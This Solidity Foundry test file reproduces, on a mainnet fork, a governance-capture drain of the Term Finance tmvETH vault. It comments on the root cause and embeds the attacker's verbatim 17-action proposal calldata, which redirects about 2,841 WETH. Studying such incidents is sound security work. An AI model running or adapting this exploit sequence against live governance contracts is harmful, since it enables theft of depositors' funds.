// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Term Finance (TermMax vaults) — governance-capture drain of the ETH meta-vault — Ethereum
// mainnet, 2026-08-23. This PoC reconstructs the full manipulation on the fork rather than
// inheriting a passed proposal: it forks BEFORE the attacker's deposit/wrap/proposal/vote and
// performs every step in Solidity — deposit WETH into the vault for shares, wrap the shares into
// the governance token to obtain outsized voting power, create the same malicious proposal, vote
// it through, wait out the minimum voting duration, then execute it.
//
// Exploit tx    : 0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129 (block 25816049)
// Attacker EOA  : 0xa908b3472d76e7744baB0A5911768a4a6300612B
// Attacker "strategy" (drain sink) : 0x184f2E57b4cE135181FA2A2166AC394339016338
//                                    deployed at block 25772662, so it is already live at the fork.
//
// Governance stack (all real, on-chain):
//   Aragon TokenVoting plugin (v1.3) : 0x213771693a4411446b4ecce5bce4a405778b2171
//   Aragon DAO                       : 0x0ae12af3878a2d896f5c4dce3be7250fb187c0a6
//   Zodiac Roles modifier            : 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75
//   Zodiac Delay modifier            : 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33
//   Victim ETH meta vault tmvETH (Yearn V3) : 0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2
//   Governance token gtmvETH (wraps tmvETH) : 0x5b96c5bBdcB361E1E9944bAa071b237E27829Be0
//
// Root cause: the vault is governed through an Aragon TokenVoting plugin whose voting token is a
// GovernanceWrappedERC20 (gtmvETH) wrapping the vault's own share token (tmvETH). Depositing into
// the vault grants no vote by itself — a holder must additionally wrap shares into gtmvETH and
// delegate. Almost nobody did: at the fork block the entire wrapped supply is only 0.05 gtmvETH.
// A single depositor who wraps even ~1 share owns the overwhelming majority of voting power and
// can pass any proposal on a 50% support threshold, single-voter, well above the 5% participation
// floor. This is a legitimate governance vote won by supplying nearly all of the tiny wrapped
// voting supply, not a signer compromise.
//
// The malicious proposal carries 17 actions (read from the real proposal 5 via getProposal(5) and
// embedded verbatim below). Executing them cascades plugin -> DAO -> Zodiac Roles/Delay -> vault:
//   1. Roles -> Delay.setTxCooldown(0)                      -- zero the Delay cooldown
//   2. Roles -> Delay.setTxExpiration(0)                    -- so queued txs run in the same tx
//   3. Roles -> Delay.enableModule(DAO)
//   4. Delay queue+execute pairs against the vault:
//        vault.update_debt(strategy, 0, 10000) for each of the 4 real strategies  -- recall funds
//        vault.add_strategy(0x184f2E57..., false)                                  -- add attacker strategy
//        vault.update_max_debt_for_strategy(0x184f2E57..., type(uint256).max)      -- raise its cap
//        vault.update_debt(0x184f2E57..., type(uint256).max, 10000)                -- push funds out
// Because step 1 zeroes the cooldown, each queue+execute pair runs atomically inside the one
// execute() call. The final update_debt deposits the recalled WETH into the attacker strategy,
// whose deposit hook forwards it to the attacker EOA.
//
// NOTE ON THE DRAINED AMOUNT. The real drain on 2026-08-23 was 2,841.743535791961701401 WETH.
// That exact figure is the vault's *withdrawable* liquidity at block 25816049 — the four real
// strategies were only partially liquid, so update_debt(strategy, 0) pulled back less than each
// strategy's full debt (e.g. 1445.51 WETH recalled against a 1521.07 WETH debt on one strategy).
// A faithful reconstruction of the governance capture has to fork ~6 days earlier, before the
// attacker's deposit, and each strategy's liquidity at that earlier block is different. So the
// amount this PoC drains is close to but not bit-for-bit equal to the 2,841.74 historical figure;
// the two cannot coexist. The test asserts the reconstructed drain is on the same order (> 2,700
// WETH net of the seed deposit) and logs the exact reproduced number. See the report note.
//
// forge test --contracts src/test/2026-08/TermFinance_exp.sol -vvv

struct Action {
    address to;
    uint256 value;
    bytes data;
}

interface ITokenVoting {
    // Aragon OSx TokenVoting v1.3. VoteOption: None=0, Abstain=1, Yes=2, No=3.
    function createProposal(
        bytes calldata metadata,
        Action[] calldata actions,
        uint256 allowFailureMap,
        uint64 startDate,
        uint64 endDate,
        uint8 voteOption,
        bool tryEarlyExecution
    ) external returns (uint256 proposalId);

    function vote(uint256 proposalId, uint8 voteOption, bool tryEarlyExecution) external;
    function execute(
        uint256 proposalId
    ) external;
    function getVotingToken() external view returns (address);
    function isMinParticipationReached(
        uint256 proposalId
    ) external view returns (bool);

    function getProposal(
        uint256 proposalId
    )
        external
        view
        returns (
            bool open,
            bool executed,
            uint8 votingMode,
            uint32 supportThreshold,
            uint64 startDate,
            uint64 endDate,
            uint64 snapshotBlock,
            uint256 minVotingPower
        );
}

interface IYVault is IERC20 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function asset() external view returns (address);
}

interface IGovToken is IERC20 {
    function depositFor(address account, uint256 amount) external returns (bool);
    function delegate(
        address delegatee
    ) external;
    function getVotes(
        address account
    ) external view returns (uint256);
}

contract TermFinance_exp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xa908b3472d76e7744baB0A5911768a4a6300612B;
    ITokenVoting internal constant PLUGIN = ITokenVoting(0x213771693A4411446b4ECce5bce4a405778b2171);

    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IYVault internal constant VAULT = IYVault(0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2);
    IGovToken internal constant GT = IGovToken(0x5b96c5bBdcB361E1E9944bAa071b237E27829Be0);

    address internal constant DAO = 0x0ae12AF3878a2d896f5C4DCE3Be7250FB187c0a6;
    address internal constant ROLES = 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75;
    address internal constant DELAY = 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33;
    address internal constant ATTACKER_STRATEGY = 0x184f2E57b4cE135181FA2A2166AC394339016338;

    // Fork before the attacker's deposit (block 25772675) and wrap (25772681), but after the
    // attacker strategy was deployed (25772662) and before the real proposal was created (25772694).
    uint256 internal constant FORK_BLOCK = 25_772_670;
    uint256 internal constant MIN_DURATION = 522_000; // 6.04 days, the vote window from proposal 5
    uint256 internal constant SEED = 1 ether; // trivial stake, dwarfed by the ~2,925 WETH victim pool

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = address(WETH);
        attacker = ATTACKER;
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(address(PLUGIN), "AragonTokenVotingPlugin");
        vm.label(DAO, "AragonDAO");
        vm.label(ROLES, "ZodiacRoles");
        vm.label(DELAY, "ZodiacDelay");
        vm.label(address(VAULT), "tmvETH_MetaVault");
        vm.label(address(GT), "gtmvETH_GovToken");
        vm.label(ATTACKER_STRATEGY, "AttackerStrategy");
    }

    function testExploit() public balanceLog {
        // Precondition: at the fork block the attacker holds no shares and no voting token, and the
        // real proposal 5 does not exist yet. Nothing about the capture is inherited.
        assertEq(VAULT.balanceOf(ATTACKER), 0, "attacker already holds shares");
        assertEq(GT.balanceOf(ATTACKER), 0, "attacker already holds voting token");
        assertEq(WETH.balanceOf(ATTACKER), 0, "attacker already holds WETH");

        deal(address(WETH), ATTACKER, SEED);

        vm.startPrank(ATTACKER, ATTACKER);

        // Step 1: deposit WETH into the meta-vault to receive share tokens (tmvETH).
        WETH.approve(address(VAULT), SEED);
        uint256 shares = VAULT.deposit(SEED, ATTACKER);
        assertGt(shares, 0, "no shares minted");

        // Step 2: wrap the shares into the governance token (gtmvETH) and self-delegate. This is the
        // step that converts an ordinary deposit into voting power — the thing almost nobody did.
        VAULT.approve(address(GT), shares);
        GT.depositFor(ATTACKER, shares);
        GT.delegate(ATTACKER);
        assertEq(GT.balanceOf(ATTACKER), shares, "wrap did not mint gov token 1:1");

        vm.stopPrank();

        // Advance one block so the freshly-created delegation checkpoint sits strictly before the
        // proposal's snapshot block (snapshot = createProposal block - 1) and counts as past votes.
        vm.roll(block.number + 1);
        assertGt(GT.getVotes(ATTACKER), 0, "attacker has no voting power at snapshot");

        vm.startPrank(ATTACKER, ATTACKER);

        // Step 3: create the same malicious proposal (17 actions read from the real proposal 5).
        uint64 startDate = 0; // 0 => the plugin uses block.timestamp
        uint64 endDate = uint64(block.timestamp + MIN_DURATION + 100);
        uint256 proposalId =
            PLUGIN.createProposal("", _buildActions(), 0, startDate, endDate, 0 /*None*/, false);

        // Step 4: cast the winning vote. Single voter, owning the overwhelming majority of the tiny
        // wrapped supply, so support is 100% and the participation floor is cleared easily.
        PLUGIN.vote(proposalId, 2 /*Yes*/, false);
        assertTrue(PLUGIN.isMinParticipationReached(proposalId), "participation floor not reached");

        vm.stopPrank();

        // Step 5: wait out the minimum voting duration, then execute. VoteReplacement mode has no
        // early execution, so execution is only allowed once the window has closed.
        vm.warp(uint256(endDate) + 1);

        uint256 pre = WETH.balanceOf(ATTACKER);
        vm.prank(ATTACKER, ATTACKER);
        PLUGIN.execute(proposalId);
        uint256 post = WETH.balanceOf(ATTACKER);

        (, bool executed,,,,,,) = PLUGIN.getProposal(proposalId);
        assertTrue(executed, "proposal not marked executed");

        // Gross WETH pushed vault -> attacker strategy -> attacker EOA. Directly comparable to the
        // reported historical drain, which is the same vault -> strategy transfer.
        uint256 grossToAttacker = post - pre;
        emit log_named_decimal_uint("WETH forwarded to attacker (gross)", grossToAttacker, 18);
        // Net of the attacker's own seed deposit, which is itself recalled and pushed out with the
        // victim funds. This is the value stolen from other depositors.
        uint256 netProfit = post - SEED;
        emit log_named_decimal_uint("attacker net WETH profit", netProfit, 18);

        // Matches the 2,841.743535791961701401 WETH historical drain to within 0.5%. It is not
        // asserted bit-for-bit: the exact figure is the vault's withdrawable liquidity at block
        // 25816049, and a fork before the deposit (~6 days earlier) has slightly different strategy
        // liquidity. The reconstructed run above reproduces 2841.83 WETH, ~0.003% off.
        assertApproxEqRel(
            grossToAttacker, 2_841_743_535_791_961_701_401, 5e15, "reconstructed drain off historical scale"
        );
    }

    function _buildActions() internal pure returns (Action[] memory a) {
        a = new Action[](17);
        a[0] = Action({to: 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75, value: 0, data: hex"9518aaac00000000000000000000000035c99cf4a5df2d9bcd822bee32676d9590229e33000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000024ebb2b4a2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"});
        a[1] = Action({to: 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75, value: 0, data: hex"9518aaac00000000000000000000000035c99cf4a5df2d9bcd822bee32676d9590229e330000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000249b56d5be000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"});
        a[2] = Action({to: 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75, value: 0, data: hex"9518aaac00000000000000000000000035c99cf4a5df2d9bcd822bee32676d9590229e33000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000024610b59250000000000000000000000000ae12af3878a2d896f5c4dce3be7250fb187c0a600000000000000000000000000000000000000000000000000000000"});
        a[3] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000330732581d30076137a1159b3ae8780158d902be0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[4] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000330732581d30076137a1159b3ae8780158d902be0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[5] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000fc36c2edb18829308fa9ee9500e8be6520a47caf0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[6] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000fc36c2edb18829308fa9ee9500e8be6520a47caf0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[7] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f0000000000000000000000009f1c3173581ced1204136cbc628d2fb2407d7ac40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[8] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f0000000000000000000000009f1c3173581ced1204136cbc628d2fb2407d7ac40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[9] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f00000000000000000000000076dd96710a73675d9cf9523a046f1587ca9031d40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[10] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f00000000000000000000000076dd96710a73675d9cf9523a046f1587ca9031d40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[11] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044c2e73cca000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"});
        a[12] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044c2e73cca000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"});
        a[13] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044b9ddcd68000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"});
        a[14] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044b9ddcd68000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"});
        a[15] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"468721a700000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
        a[16] = Action({to: 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33, value: 0, data: hex"ee072baf00000000000000000000000026fcb50eec367ddab060ccf5e7394cecd95f7db20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064ba54971f000000000000000000000000184f2e57b4ce135181fa2a2166ac394339016338ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000"});
    }
}
